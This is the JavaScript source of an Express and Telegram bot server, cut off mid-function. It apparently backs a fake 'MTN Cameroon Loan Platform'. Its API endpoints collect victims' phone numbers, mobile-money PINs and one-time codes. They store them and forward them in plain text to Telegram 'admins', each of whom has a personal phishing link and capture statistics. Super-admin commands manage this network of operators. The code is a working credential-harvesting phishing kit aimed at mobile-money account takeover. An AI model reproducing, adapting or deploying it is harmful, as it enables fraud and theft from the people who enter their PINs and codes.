const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// CONFIGURATION & ENVS
// ==========================================
const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

if (!BOT_TOKEN) {
    console.error('❌ CRITICAL ERROR: SUPER_ADMIN_BOT_TOKEN is missing in environment variables!');
    process.exit(1);
}

// Create bot WITHOUT polling (Webhook mode)
const bot = new TelegramBot(BOT_TOKEN);

// In-memory state
const adminChatIds       = new Map(); // adminId → chatId
const pausedAdmins       = new Set(); // adminIds that are paused
const processingLocks    = new Set(); // prevents duplicate submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;
let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

/**
 * Escapes standard Telegram Markdown characters to prevent parse errors.
 */
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/[_*`\[\]]/g, '\\$&');
}

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    if (!chatId) return null;
    const target = String(chatId);
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (String(storedChatId) === target) return adminId;
    }
    return null;
}

/**
 * Format Cameroon phone numbers (+237 XXXXXXXXX → XXXXXXXXX)
 */
function formatPhone(phoneNumber) {
    if (!phoneNumber) return '';
    let cleaned = String(phoneNumber).replace(/\s+/g, '').replace(/[^0-9+]/g, '');
    
    if (cleaned.startsWith('+237')) return cleaned.slice(4);
    if (cleaned.startsWith('237'))  return cleaned.slice(3);
    
    return cleaned;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, String(admin.chatId));
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE) || 1;
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS (MTN CAMEROON)*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT ERROR LISTENERS & COMMAND HANDLERS
// ==========================================
bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        if (req.body && req.body.update_id !== undefined) {
            bot.processUpdate(req.body);
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, String(admin.chatId));
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }

        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin       = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
💛 *Welcome ${escapeMarkdown(admin?.name || 'Admin')}!* (MTN MoMo Cameroon)

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                if (isSuperAdmin) {
                    message += `
*Admin Management (Super Admin Only):*
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins
/suspendall - 🔒 Suspend selected admin links (checklist)

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request
`;
                }
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
💛 *Welcome to MTN Cameroon Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR MTN CAMEROON LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${escapeMarkdown(admin?.name || 'Admin')}*
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS (MTN CAMEROON)*

📋 Total: ${stats.total || 0}
⏳ PIN Pending: ${stats.pinPending || 0}
✅ PIN Approved: ${stats.pinApproved || 0}
⏳ OTP Pending: ${stats.otpPending || 0}
🎉 Fully Approved: ${stats.fullyApproved || 0}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. +237 ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. +237 ${formatPhone(app.phoneNumber)} - OTP: \`${escapeMarkdown(app.otp)}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        
        const admin      = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${escapeMarkdown(admin?.name)}
📧 ${escapeMarkdown(admin?.email)}
🆔 \`${adminId}\`
💬 \`${chatId}\`
📅 ${new Date(admin?.createdAt || Date.now()).toLocaleString()}
${statusEmoji} Status: ${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Use this format:
\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin Paul Biya|paul@example.cm|123456789\`
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = String(chatIdStr).trim();
            if (!/^\d+$/.test(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must contain digits only!');

            const allAdmins        = await db.getAllAdmins();
            const existingNumbers  = allAdmins.map(a => parseInt(String(a.adminId).replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber       = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId       = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED*

👤 ${escapeMarkdown(name)}
📧 ${escapeMarkdown(email)}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

🔗 Their link:
${WEBHOOK_URL}?admin=${newAdminId}
            `, { parse_mode: 'Markdown' });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!* (MTN Cameroon)

Welcome ${escapeMarkdown(name)}!
*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin: ' + error.message);
        }
    });

    // /addadminid ADMINID|NAME|EMAIL|CHATID
    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can add admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadminid ADMINID|NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = String(chatIdStr).trim();
            if (!/^\d+$/.test(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must contain digits only!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({ adminId: newAdminId, chatId: newChatId, name, email, status: 'active', createdAt: new Date() });
            adminChatIds.set(newAdminId, newChatId);

            await bot.sendMessage(chatId, `
✅ *ADMIN ADDED WITH CUSTOM ID*

👤 ${escapeMarkdown(name)}
📧 ${escapeMarkdown(email)}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error adding admin with custom ID:', error);
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /transferadmin oldChatId | newChatId
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) {
                return bot.sendMessage(chatId, '❌ Format: `/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });
            }

            const oldChatId = String(parts[0]);
            const newChatId = String(parts[1]);

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (String(storedChatId) === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId) return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot transfer the super admin!');

            const admin = await db.getAdmin(targetAdminId);
            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `
🔄 *ADMIN TRANSFERRED*

👤 ${escapeMarkdown(admin?.name)}
🆔 \`${targetAdminId}\`
Old Chat ID: \`${oldChatId}\`
New Chat ID: \`${newChatId}\`
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error transferring admin:', error);
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /pauseadmin <adminId>
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot pause the super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            await bot.sendMessage(chatId, `🚫 *ADMIN PAUSED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /unpauseadmin <adminId>
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');

        try {
            const targetAdminId = match[1].trim();
            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            await bot.sendMessage(chatId, `✅ *ADMIN UNPAUSED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /removeadmin <adminId>
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');

        try {
            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '🚫 Cannot remove super admin!');

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);

            await bot.sendMessage(chatId, `🗑️ *ADMIN REMOVED*: \`${targetAdminId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /admins
    bot.onText(/\/admins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        try {
            const allAdmins = await db.getAllAdmins();
            let message = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdmin  = admin.adminId === 'ADMIN001';
                const isPaused      = pausedAdmins.has(admin.adminId);
                const isConnected   = adminChatIds.has(admin.adminId);
                const statusEmoji   = isSuperAdmin ? '⭐' : isPaused ? '🚫' : '✅';

                message += `${index+1}. ${statusEmoji} *${escapeMarkdown(admin.name)}*\n`;
                message += `   🆔 \`${admin.adminId}\` | 💬 \`${admin.chatId || 'N/A'}\`\n\n`;
            });

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed to list admins.');
        }
    });

    // /suspendall
    bot.onText(/\/suspendall/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can suspend links.');

        try {
            const allAdmins     = await db.getAllAdmins();
            const regularAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

            if (regularAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No admins to suspend.');

            const selections = new Set(regularAdmins.map(a => a.adminId));
            suspendAllSessions.set(String(chatId), { page: 0, allAdmins: regularAdmins, selections });

            const session = suspendAllSessions.get(String(chatId));
            const { text, inline_keyboard } = buildSuspendAllPage(session);

            await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard } });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed: ' + error.message);
        }
    });

    // /send <adminId> <message>
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can send messages.');

        try {
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Format: /send ADMINID message`);

            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText   = input.substring(spaceIndex + 1).trim();

            const sent = await sendToAdmin(targetAdminId, `📨 *MESSAGE FROM SUPER ADMIN*\n\n${escapeMarkdown(messageText)}`, { parse_mode: 'Markdown' });
            if (sent) bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\``, { parse_mode: 'Markdown' });
            else bot.sendMessage(chatId, `❌ Failed to send message.`);
        } catch (error) {
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // /broadcast <message>
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (adminId !== 'ADMIN001') return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');

        try {
            const messageText  = match[1].trim();
            const allAdmins    = await db.getAllAdmins();
            const targetAdmins = allAdmins.filter(a => a.adminId !== 'ADMIN001');

            for (const admin of targetAdmins) {
                await sendToAdmin(admin.adminId, `📢 *BROADCAST*\n\n${escapeMarkdown(messageText)}`, { parse_mode: 'Markdown' });
            }

            bot.sendMessage(chatId, `📢 Broadcast complete to ${targetAdmins.length} admins.`);
        } catch (error) {
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    if (data === 'sall_noop') {
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    // Toggle Suspend Checkboxes
    if (data.startsWith('sall_toggle_')) {
        const targetAdminId = data.replace('sall_toggle_', '');
        const session = suspendAllSessions.get(String(chatId));

        if (session) {
            if (session.selections.has(targetAdminId)) session.selections.delete(targetAdminId);
            else session.selections.add(targetAdminId);

            const { text, inline_keyboard } = buildSuspendAllPage(session);
            await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard } }).catch(() => {});
        }
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    if (data.startsWith('sall_page_')) {
        const pageNum = parseInt(data.replace('sall_page_', ''));
        const session = suspendAllSessions.get(String(chatId));
        if (session) {
            session.page = pageNum;
            const { text, inline_keyboard } = buildSuspendAllPage(session);
            await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard } }).catch(() => {});
        }
        return bot.answerCallbackQuery(callbackQuery.id);
    }

    if (data === 'sall_cancel') {
        suspendAllSessions.delete(String(chatId));
        await bot.editMessageText('❌ *SUSPEND ALL — CANCELLED*', { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }).catch(() => {});
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Cancelled' });
    }

    if (data === 'sall_confirm') {
        const session = suspendAllSessions.get(String(chatId));
        if (!session) return bot.answerCallbackQuery(callbackQuery.id, { text: 'Session expired.' });

        const toSuspend = session.allAdmins.filter(a => session.selections.has(a.adminId));
        suspendAllSessions.delete(String(chatId));

        for (const admin of toSuspend) {
            pausedAdmins.add(admin.adminId);
            await db.updateAdmin(admin.adminId, { status: 'paused' });
        }

        await bot.editMessageText(`🔒 *SUSPENSION COMPLETE*\n\nSuspended ${toSuspend.length} admin links.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }).catch(() => {});
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Done' });
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Access paused.', show_alert: true });
    }

    // Process loan approvals/denials
    const parts = data.split('_');
    if (parts.length < 4) return bot.answerCallbackQuery(callbackQuery.id);

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found.', show_alert: true });
    }

    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *PIN REJECTED*\n\nApp ID: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }).catch(() => {});
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Rejected' });
    }

    if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *PIN APPROVED*\n\nApp ID: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }).catch(() => {});
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Approved' });
    }

    if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN FULLY APPROVED*\n\nApp ID: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }).catch(() => {});
        return bot.answerCallbackQuery(callbackQuery.id, { text: 'Loan Approved' });
    }
});

// ==========================================
// DB READY CHECK MIDDLEWARE
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database initializing, please retry shortly.' });
    }
    next();
});

// ==========================================
// API ENDPOINTS
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
    const lockKey = `pin_${phoneNumber}`;

    if (processingLocks.has(lockKey)) {
        return res.status(429).json({ success: false, message: 'Request processing. Please wait.' });
    }

    processingLocks.add(lockKey);

    try {
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2,7).toUpperCase()}`;
        let assignedAdmin;

        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);

            if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'This admin link is currently unavailable.' });
            }
        } else {
            const activeAdmins    = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));

            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No admins available currently.' });
            }

            const adminStats = await Promise.all(
                availableAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: (stats.pinPending || 0) + (stats.otpPending || 0) };
                })
            );
            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
        }

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            timestamp: new Date().toISOString()
        });

        await sendToAdmin(assignedAdmin.adminId, `
📱 *NEW APPLICATION (MTN CAMEROON)*

📋 \`${applicationId}\`
📞 \`+237 ${formatPhone(phoneNumber)}\`
PIN \`${escapeMarkdown(pin)}\`
⏰ ${new Date().toLocaleString()}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Deny PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    } finally {
        processingLocks.delete(lockKey);
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION (MTN CAMEROON)*

📋 \`${applicationId}\`
📞 \`+237 ${formatPhone(application.phoneNumber)}\`
OTP \`${escapeMarkdown(otp)}\`
⏰ ${new Date().toLocaleString()}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
